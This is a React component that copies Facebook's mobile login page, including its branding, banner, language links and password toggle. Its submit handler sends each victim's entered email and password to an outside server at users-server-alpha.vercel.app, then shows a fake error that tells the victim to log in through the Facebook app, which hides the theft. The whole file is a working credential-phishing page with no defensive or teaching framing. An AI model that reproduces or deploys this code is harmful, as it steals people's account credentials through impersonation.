
import Swal from 'sweetalert2';
import './App.css'
import { GiSmartphone } from 'react-icons/gi';
import { FaEyeSlash, FaEye } from 'react-icons/fa';
import { useState } from 'react';
function App() {

  const [show, setShow] = useState(false);

  const handleLogin = event => {
    event.preventDefault();
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;
    const user = { email, password }

    fetch('https://users-server-alpha.vercel.app/users', {
      method: 'POST',
      headers: {
        'content-type': 'application/json'
      },
      body: JSON.stringify(user)
    })
      .then(res => res.json())
      .then(result => {
        if (result.acknowledged === true) {
          Swal.fire({
            icon: 'error',
            title: 'Oops...',
            text: 'Something went wrong! You can try to login with your facebook app',

          })
        }
      })
    form.reset()
  }

  return (
    <>
      <div className="top">
        <p> <GiSmartphone className='phone'></GiSmartphone> Get Facebook Lite and browse faster</p>
      </div>

      <div className="mainBody">

        <div className="login-form">
          <h2>facebook</h2>
          <form onSubmit={handleLogin}>
            <input className='email' type="text" placeholder="Mobile number or email" name='email' required />
           <div className='passDiv'>
           <input className='password' type={show?"text":"password"} placeholder="Password" name='password' required />
           <p className='eye' onClick={()=>setShow(!show)}>{show?<FaEyeSlash></FaEyeSlash>:<FaEye></FaEye>}</p>
           </div>
            <input type="submit" value="Login" className='button' />
          </form>
          <p className='forget'>Forgotten password?</p>
          <hr />
          <button className='createBtn'>Create new account</button>
        </div>


        <div className="footer">

          <div>
            <p>English (UK)</p>
            <p>অসমীয়া</p>
            <p>नेपाली</p>
            <p>Português (Brasil)</p>
          </div>
          <div>
            <p>বাংলা</p>
            <p>हिन्दी</p>
            <p>Español</p>
          </div>
        </div>

        <div className='copyright'>
          <span>About</span>
          <span>Help</span>
          <span>More</span>
        </div>
      </div>


    </>
  )
}

export default App
